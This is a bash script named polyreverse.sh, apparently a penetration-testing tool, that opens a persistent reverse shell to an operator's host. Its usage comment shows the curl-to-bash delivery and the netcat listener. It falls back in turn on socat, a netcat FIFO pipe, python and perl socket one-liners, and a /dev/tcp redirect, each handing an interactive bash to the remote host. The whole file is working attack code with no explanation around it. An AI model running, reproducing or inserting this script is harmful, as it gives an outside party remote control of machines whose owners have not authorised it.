#!/bin/bash

# USAGE #
# ipv4=10.10.14.41
# port=443
# Throw: curl -s http://$ipv4/polyreverse.sh | bash -s $ipv4 $port
# Catch: nc -nlvp $port 

host=${1:-"127.0.0.1"}
port=${2:-"443"}

if command -v socat > /dev/null 2>&1; then
	while true; do
		socat TCP4:$host:$port EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane 2>/dev/null;
	done;
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	while true; do
		rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $host $port >/tmp/f 2>/dev/null;
	done;
	exit;
fi

if command -v python > /dev/null 2>&1; then
	while true; do
		python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('$host',$port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/bash','-i']);" 2>/dev/null;
	done;
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	while true; do
		perl -e "use Socket;\$i='$host';\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/bash -i');};" 2>/dev/null;
	done;
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/$host/$port 0>&1 2>/dev/null;
	exit;
fi
